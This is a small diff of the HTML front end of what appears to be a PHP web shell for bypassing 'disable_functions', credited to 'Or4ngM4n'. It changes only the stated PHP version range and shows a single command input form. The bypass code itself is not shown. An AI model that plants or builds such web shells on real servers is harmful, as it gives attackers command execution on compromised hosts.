@@ -1,10 +1,10 @@
 <head>
-<title>Bypass - PHP 7.4-8</title>
+<title>Bypass - PHP 7.3-8</title>
 <body style="background-color:#4d4d4d;">
 </body>
 <center>
 <form action="" method="post">
-  <br><br><h1>Bypass disable_functions bypass 7.4 - 8 - Or4ngM4n</h1>
+  <br><br><h1>Bypass disable_functions bypass 7.3 - 8 - Or4ngM4n</h1>
   <input type="text" id="or4ng" name="or4ng">
   <input type="submit" value="Submit">
 </form>
